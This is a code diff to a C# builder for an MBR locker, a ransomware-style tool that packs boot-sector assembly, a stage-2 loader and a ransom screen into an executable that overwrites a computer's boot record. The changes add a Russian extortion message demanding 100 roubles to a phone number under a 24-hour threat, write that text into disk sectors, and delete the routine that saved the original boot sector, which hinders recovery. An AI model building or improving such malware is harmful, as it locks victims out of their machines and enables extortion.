@@ -31,7 +31,7 @@ namespace MbrLockerBuilder
 
         public MainForm()
         {
-            this.Text = "MBR Locker Builder v5.0 (Stealth + Stage2)";
+            this.Text = "MBR Locker Builder v6.0 (Russian Support + Text Sectors)";
             this.Size = new Size(1000, 750);
             this.BackColor = Color.FromArgb(10, 15, 10);
             this.ForeColor = Color.FromArgb(0, 255, 100);
@@ -52,10 +52,10 @@ namespace MbrLockerBuilder
             int controlWidth = 400;
 
             Label lblTitle = new Label();
-            lblTitle.Text = "ЗАГОЛОВОК:";
+            lblTitle.Text = "ЗАГОЛОВОК (можно русский):";
             lblTitle.Left = leftLabel;
             lblTitle.Top = y;
-            lblTitle.Width = 150;
+            lblTitle.Width = 200;
             lblTitle.ForeColor = Color.FromArgb(0, 255, 100);
             lblTitle.Font = new Font("Consolas", 10, FontStyle.Bold);
             this.Controls.Add(lblTitle);
@@ -72,7 +72,7 @@ namespace MbrLockerBuilder
             y += 40;
 
             Label lblBody = new Label();
-            lblBody.Text = "ТЕКСТ (БЕЗ ОГРАНИЧЕНИЙ):";
+            lblBody.Text = "ТЕКСТ (можно русский):";
             lblBody.Left = leftLabel;
             lblBody.Top = y;
             lblBody.Width = 200;
@@ -94,10 +94,10 @@ namespace MbrLockerBuilder
             y += 140;
 
             Label lblPass = new Label();
-            lblPass.Text = "ПАРОЛЬ:";
+            lblPass.Text = "ПАРОЛЬ (виден при вводе):";
             lblPass.Left = leftLabel;
             lblPass.Top = y;
-            lblPass.Width = 150;
+            lblPass.Width = 200;
             lblPass.ForeColor = Color.FromArgb(0, 255, 100);
             lblPass.Font = new Font("Consolas", 10, FontStyle.Bold);
             this.Controls.Add(lblPass);
@@ -203,10 +203,10 @@ namespace MbrLockerBuilder
             this.Controls.Add(this.btnBuild);
 
             this.lblStatus = new Label();
-            this.lblStatus.Text = "Готов (Stage2 режим)";
+            this.lblStatus.Text = "Готов (пароль виден при вводе)";
             this.lblStatus.Left = leftControl + 320;
             this.lblStatus.Top = y + 10;
-            this.lblStatus.Width = 400;
+            this.lblStatus.Width = 450;
             this.lblStatus.ForeColor = Color.FromArgb(0, 200, 100);
             this.lblStatus.Font = new Font("Consolas", 10);
             this.Controls.Add(this.lblStatus);
@@ -222,10 +222,8 @@ namespace MbrLockerBuilder
 
         private void LoadDefaultValues()
         {
-            this.txtTitle.Text = "COMPUTER LOCKED";
-            this.txtBody.Text = "Your computer has been locked for security reasons.\n" +
-                              "Please enter the password to unlock your system.\n\n" +
-                              "Contact your administrator for assistance.";
+            this.txtTitle.Text = "Компьютер заблокирован!";
+            this.txtBody.Text = "Ваш компьютер заблокирован за использование нелегального ПО, включая чит ПО. Для разблокировки вашего компьютера необходимо отправить 100 рублей на номер +7xxxxxxxxxx, и вам приедет код разблокировки в сообщении. Внимание! В случае неуплаты в течение 24 часов компьютер будет невозможно восстановить.";
             this.txtPassword.Text = "48284dkf8";
         }
 
@@ -264,7 +262,7 @@ namespace MbrLockerBuilder
                     case 5: fgColor = Color.Magenta; break;
                 }
 
-                using (Font font = new Font("Consolas", 12, FontStyle.Regular))
+                using (Font font = new Font("Consolas", 11, FontStyle.Regular))
                 using (Brush brush = new SolidBrush(fgColor))
                 {
                     string title = this.txtTitle.Text.Trim();
@@ -279,38 +277,110 @@ namespace MbrLockerBuilder
                     int x = 20;
                     int y = 20;
 
-                    string titleLine = "[ " + title + " ]";
-                    g.DrawString(titleLine, font, brush, x, y);
-                    y += 25;
-
-                    g.DrawLine(new Pen(fgColor, 1), x, y, 620, y);
+                    // Рамка
+                    string border = "========================================";
+                    g.DrawString(border, font, brush, x, y);
                     y += 20;
 
+                    // Заголовок
+                    string titleLine = "     " + title + "     ";
+                    g.DrawString(titleLine, font, brush, x, y);
+                    y += 20;
+
+                    g.DrawString(border, font, brush, x, y);
+                    y += 25;
+
+                    // Текст
                     string[] bodyLines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                     foreach (string line in bodyLines)
                     {
-                        g.DrawString(line.Trim(), font, brush, x, y);
-                        y += 20;
+                        string wrapped = line.Trim();
+                        while (wrapped.Length > 60)
+                        {
+                            int cut = 60;
+                            if (cut > wrapped.Length) cut = wrapped.Length;
+                            g.DrawString(wrapped.Substring(0, cut), font, brush, x, y);
+                            y += 18;
+                            wrapped = wrapped.Substring(cut);
+                        }
+                        if (wrapped.Length > 0)
+                        {
+                            g.DrawString(wrapped, font, brush, x, y);
+                            y += 18;
+                        }
                     }
 
-                    y += 10;
+                    y += 5;
                     g.DrawString("Password: ", font, brush, x, y);
 
-                    string stars = new string('*', Math.Min(password.Length, 25));
-                    SizeF starsSize = g.MeasureString(stars, font);
-                    g.DrawString(stars, font, brush, x + 100, y);
+                    // ОТОБРАЖАЕМ РЕАЛЬНЫЙ ПАРОЛЬ (без звездочек)
+                    string visiblePassword = password;
+                    SizeF passSize = g.MeasureString(visiblePassword, font);
+                    g.DrawString(visiblePassword, font, brush, x + 110, y);
 
                     y += 20;
-                    g.DrawString("█", font, new SolidBrush(Color.White), x + 100 + starsSize.Width + 2, y - 20);
+                    g.DrawString("█", font, new SolidBrush(Color.White), x + 110 + passSize.Width + 2, y - 20);
                 }
             }
             this.previewBox.Image = bmp;
         }
 
+        // ============================================================
+        // МЕТОДЫ ДЛЯ ПОДДЕРЖКИ РУССКОГО ЯЗЫКА
+        // ============================================================
+
+        private string ConvertToDosHex(string text)
+        {
+            if (string.IsNullOrEmpty(text)) return "";
+            
+            try
+            {
+                Encoding dos = Encoding.GetEncoding(866);
+                byte[] bytes = dos.GetBytes(text);
+                return string.Join(", ", bytes.Select(b => "0x" + b.ToString("X2")));
+            }
+            catch
+            {
+                byte[] bytes = Encoding.ASCII.GetBytes(text);
+                return string.Join(", ", bytes.Select(b => "0x" + b.ToString("X2")));
+            }
+        }
+
+        private bool ContainsRussian(string text)
+        {
+            if (string.IsNullOrEmpty(text)) return false;
+            return text.Any(c => (c >= 'А' && c <= 'я') || c == 'Ё' || c == 'ё');
+        }
+
+        // ============================================================
+        // ОСНОВНЫЕ МЕТОДЫ
+        // ============================================================
+
         private void BtnBuild_Click(object sender, EventArgs e)
         {
             try
             {
+                // Проверка на русский в пароле
+                if (ContainsRussian(this.txtPassword.Text))
+                {
+                    DialogResult result = MessageBox.Show(
+                        "⚠️ Пароль содержит русские буквы!\n\n" +
+                        "BIOS не поддерживает русские буквы в пароле.\n" +
+                        "Пользователь не сможет ввести русский пароль.\n\n" +
+                        "Рекомендуется использовать только:\n" +
+                        "- Латинские буквы (A-Z, a-z)\n" +
+                        "- Цифры (0-9)\n" +
+                        "- Спецсимволы (!@#$%^&*)\n\n" +
+                        "Продолжить с текущим паролем?",
+                        "Предупреждение",
+                        MessageBoxButtons.YesNo,
+                        MessageBoxIcon.Warning
+                    );
+                    
+                    if (result == DialogResult.No)
+                        return;
+                }
+
                 this.lblStatus.Text = "1/7 Поиск ресурсов...";
                 Application.DoEvents();
 
@@ -353,8 +423,41 @@ namespace MbrLockerBuilder
 
                 int totalSectors = 16;
                 byte[] fullImage = new byte[512 * totalSectors];
+                
+                // Копируем MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
+                
+                // Копируем Stage2 (сектор 3)
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
+                
+                // ============================================================
+                // ЗАПИСЫВАЕМ ТЕКСТ В ОТДЕЛЬНЫЕ СЕКТОРА (4, 5, 6)
+                // ============================================================
+                
+                string title = this.txtTitle.Text.Trim();
+                string body = this.txtBody.Text.Trim();
+                if (string.IsNullOrEmpty(title)) title = "LOCKED";
+                if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
+
+                string border = "========================================\r\n";
+                string formattedTitle = "     " + title + "     \r\n";
+                string formattedBody = body.Replace("\n", "\r\n");
+
+                string fullText = border + formattedTitle + border + "\r\n" + formattedBody;
+
+                byte[] textBytes = Encoding.GetEncoding(866).GetBytes(fullText);
+                if (textBytes.Length > 512 * 3)
+                {
+                    Array.Resize(ref textBytes, 512 * 3);
+                }
+
+                byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(border + formattedTitle + border + "\r\n");
+                if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
+                Array.Copy(titleBytes, 0, fullImage, 512 * 4, titleBytes.Length);
+                
+                byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(formattedBody);
+                if (bodyBytes.Length > 512 * 2) Array.Resize(ref bodyBytes, 512 * 2);
+                Array.Copy(bodyBytes, 0, fullImage, 512 * 5, bodyBytes.Length);
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -372,11 +475,9 @@ namespace MbrLockerBuilder
                 this.lblStatus.Text = "6/7 Встраивание MBR как ресурс...";
                 Application.DoEvents();
 
-                // Сохраняем template во временный файл
                 string tempTemplatePath = Path.Combine(Path.GetTempPath(), "template_temp.exe");
                 File.WriteAllBytes(tempTemplatePath, templateBytes);
 
-                // Добавляем ресурс через WinAPI
                 string outputPath = Path.Combine(Path.GetTempPath(), "payload_temp.exe");
                 File.Copy(tempTemplatePath, outputPath, true);
 
@@ -384,18 +485,15 @@ namespace MbrLockerBuilder
                 if (hUpdate == IntPtr.Zero)
                     throw new Exception("Не удалось открыть файл для обновления ресурсов!");
 
-                // Добавляем ресурс "MBR" типа "BINARY"
                 if (!UpdateResource(hUpdate, "BINARY", "MBR", 0, fullImage, (uint)fullImage.Length))
                 {
                     EndUpdateResource(hUpdate, true);
                     throw new Exception("Не удалось добавить ресурс MBR!");
                 }
 
-                // Добавляем ресурс "BSOD" (если галочка включена)
                 if (this.chkBSOD.Checked)
                 {
                     byte[] bsodData = new byte[1] { 0x01 };
-                    // Используем RT_RCDATA (стандартный тип для бинарных данных)
                     if (!UpdateResource(hUpdate, "RT_RCDATA", "BSOD", 0, bsodData, 1))
                     {
                         EndUpdateResource(hUpdate, true);
@@ -408,7 +506,6 @@ namespace MbrLockerBuilder
 
                 byte[] payloadBytes = File.ReadAllBytes(outputPath);
 
-                // Чистим временные файлы
                 try { File.Delete(tempTemplatePath); } catch { }
                 try { File.Delete(outputPath); } catch { }
 
@@ -426,6 +523,7 @@ namespace MbrLockerBuilder
                         $"Размер образа: {fullImage.Length} байт ({fullImage.Length / 512} секторов)\n" +
                         $"MBR: {mbrBytes.Length} байт\n" +
                         $"Stage2: {stage2Bytes.Length} байт\n" +
+                        $"Текст: {textBytes.Length} байт (сектора 4-6)\n" +
                         $"Путь: {this.saveFileDialog.FileName}",
                         "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
@@ -483,13 +581,12 @@ start:
     mov sp, 0x7C00
     sti
 
-    call save_mbr
-
+    ; Загружаем Stage2 из сектора 3 (6 секторов: 3-8)
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x8000
     mov ah, 0x02
-    mov al, 8
+    mov al, 6
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -503,34 +600,6 @@ load_error:
     mov si, msg_error
     call print
     jmp hang
-
-save_mbr:
-    pusha
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7E00
-    mov ah, 0x02
-    mov al, 1
-    mov ch, 0
-    mov cl, 1
-    mov dh, 0
-    mov dl, 0x80
-    int 0x13
-    jc .error
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7E00
-    mov ah, 0x03
-    mov al, 1
-    mov ch, 0
-    mov cl, 2
-    mov dh, 0
-    mov dl, 0x80
-    int 0x13
-.error:
-    popa
-    ret
 
 print:
     lodsb
@@ -563,14 +632,25 @@ dw 0xAA55";
             else
                 template = File.ReadAllText("locker/stage2.asm");
 
-            string title = this.txtTitle.Text.Trim();
-            string body = this.txtBody.Text.Trim().Replace("\r\n", "\\r\\n").Replace("\n", "\\r\\n");
             string password = this.txtPassword.Text.Trim();
-
-            if (string.IsNullOrEmpty(title)) title = "LOCKED";
             if (string.IsNullOrEmpty(password)) password = "admin";
-            if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
 
+            // Пароль в HEX
+            string passwordHex;
+            if (ContainsRussian(password))
+            {
+                string cleanPassword = new string(password.Where(c => c < 128).ToArray());
+                if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
+                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
+            }
+            else
+            {
+                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
+            }
+
+            template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
+
+            // Цвета
             string textColor = "0A";
             switch (this.cmbTextColor.SelectedIndex)
             {
@@ -593,9 +673,6 @@ dw 0xAA55";
 
             bool enableBSOD = this.chkBSOD.Checked;
 
-            template = template.Replace("{TITLE}", title);
-            template = template.Replace("{BODY}", body);
-            template = template.Replace("{PASSWORD}", password);
             template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
             template = template.Replace("mov ax, 0x0A00", "mov ax, 0x" + textColor + "00");
 
